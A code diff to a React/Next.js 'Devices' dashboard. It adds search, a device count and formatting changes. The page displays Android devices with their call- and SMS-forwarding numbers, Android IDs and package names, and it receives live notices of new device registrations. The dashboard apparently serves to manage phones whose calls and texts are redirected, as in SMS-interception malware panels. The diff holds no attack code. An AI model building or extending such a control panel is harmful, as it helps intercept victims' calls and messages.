@@ -14,14 +14,17 @@ export default function Page() {
   const [devices, setDevices] = useState([]);
   const [page, setPage] = useState(1);
   const [totalPages, setTotalPages] = useState(1);
+  const [total, setTotal] = useState(0);
   const [loading, setLoading] = useState(false);
+  const [search, setSearch] = useState("");
+
   const authuser = useUser();
 
   const router = useRouter();
 
   // Initialize Socket.IO
   useEffect(() => {
-      if (!authuser) return;
+    if (!authuser) return;
     const socket = getSocket(authuser);
 
     socket.on("connect", () => {
@@ -29,8 +32,8 @@ export default function Page() {
     });
 
     socket.on("new_device_insert", (data) => {
-        toast.success(data.message);
-        fetchDevices(page);
+      toast.success(data.message);
+      fetchDevices(page);
     });
 
     socket.on("device_status_update", (data) => {
@@ -48,32 +51,41 @@ export default function Page() {
       socket.off("new_device_data");
     };
   }, [authuser]);
-  
 
 
-  const fetchDevices = async (page) => {
-    setLoading(true);
-    try {
-      const res = await fetch(`/api/devices?page=${page}&limit=9`);
-      const json = await res.json();
-      setDevices(json.data);
-      setTotalPages(json.pagination.totalPages);
-    } catch (err) {
-      console.error("Error fetching devices:", err);
-    }
-    setLoading(false);
-  };
+const fetchDevices = async (page, searchTerm = "") => {
+  setLoading(true);
+  try {
+    const res = await fetch(`/api/devices?page=${page}&limit=9&search=${encodeURIComponent(searchTerm)}`);
+    const json = await res.json();
+    setDevices(json.data);
+    setTotalPages(json.pagination.totalPages);
+    setTotal(json.pagination.total);
+  } catch (err) {
+    console.error("Error fetching devices:", err);
+  }
+  setLoading(false);
+};
+
 
   useEffect(() => {
     fetchDevices(page);
   }, [page]);
 
 
+  useEffect(() => {
+  const delayDebounce = setTimeout(() => {
+    fetchDevices(1, search);
+  }, 500);
+  return () => clearTimeout(delayDebounce);
+}, [search]);
+
+
   const handleDelete = async (id) => {
     let confirm = window.confirm("Are you sure you want to delete this entry?");
     if (!confirm) return;
     let password = null;
-    if(authuser.role !== "admin") {
+    if (authuser.role !== "admin") {
       password = prompt("Enter admin password to delete this entry:");
       if (!password) return;
     }
@@ -104,23 +116,34 @@ export default function Page() {
 
   return (
     <main className="flex-1 p-6 bg-gray-100 min-h-screen">
-      <header className="flex justify-between items-center">
-        <h2 className="text-3xl font-bold mb-6 text-gray-800">Devices</h2>
-        <button
-          onClick={() => fetchDevices(page)}
-          className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-xl shadow hover:bg-blue-700 transition-all"
-        >
-          <Send className="w-4 h-4" />
-          Refresh
-        </button>
+      <header className="flex flex-col md:flex-row justify-between items-center gap-3">
+        <h2 className="text-3xl font-bold text-gray-800">Devices ({total})</h2>
+
+        <div className="flex gap-2 items-center w-full md:w-auto">
+          <input
+            type="text"
+            value={search}
+            onChange={(e) => setSearch(e.target.value)}
+            placeholder="Search device..."
+            className="border border-gray-300 rounded-xl px-4 py-2 w-full md:w-64 focus:ring-2 focus:ring-blue-500 focus:outline-none"
+          />
+          <button
+            onClick={() => fetchDevices(page)}
+            className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-xl shadow hover:bg-blue-700 transition-all"
+          >
+            <Send className="w-4 h-4" />
+            Refresh
+          </button>
+        </div>
       </header>
+
 
       {loading ? (
         <div className="flex justify-center items-center h-64">
           <Loader2 className="animate-spin text-blue-600 w-8 h-8" />
         </div>
       ) : (
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mt-3">
           {devices.map((device, index) => (
             <div
               key={device.id}
@@ -141,13 +164,13 @@ export default function Page() {
                 <p className="text-gray-700 mb-1">
                   <span className="font-medium">Call Forwarding To: </span>{" "}
                   {
-                    device.call_forwarding_to_number_status=="Disabled" ? <span className='text-red-500'>Disabled</span> : device.call_forwarding_to_number
+                    device.call_forwarding_to_number_status == "Disabled" ? <span className='text-red-500'>Disabled</span> : device.call_forwarding_to_number
                   }
                 </p>
                 <p className="text-gray-700 mb-1">
                   <span className="font-medium">SMS Forwarding To: </span>{" "}
                   {
-                    device.sms_forwarding_to_number_status=="Disabled" ? <span className='text-red-500'>Disabled</span> : device.sms_forwarding_to_number
+                    device.sms_forwarding_to_number_status == "Disabled" ? <span className='text-red-500'>Disabled</span> : device.sms_forwarding_to_number
                   }
                 </p>
 
@@ -167,15 +190,15 @@ export default function Page() {
                 </p>
                 <p className="text-gray-400 text-sm">
                   <span className="font-medium">Reged. :</span>{" "}
-                    {currentTime(device.created_at)} By {device.form_code }
+                  {currentTime(device.created_at)} By {device.form_code}
                 </p>
                 <p className="text-gray-400 text-sm mb-1">
                   <span className="font-medium">Android Id:</span>{" "}
-                    {device.android_id || "-"}
+                  {device.android_id || "-"}
                 </p>
                 <p className="text-gray-400 text-sm mb-1">
                   <span className="font-medium">Package:</span>{" "}
-                    {device.package_name || "-"}
+                  {device.package_name || "-"}
                 </p>
 
               </div>
@@ -201,7 +224,7 @@ export default function Page() {
       )}
 
       {/* Pagination */}
-      
+
       {/* Pagination */}
       {totalPages > 1 && (
         <div className="flex justify-center items-center mt-10 gap-3">
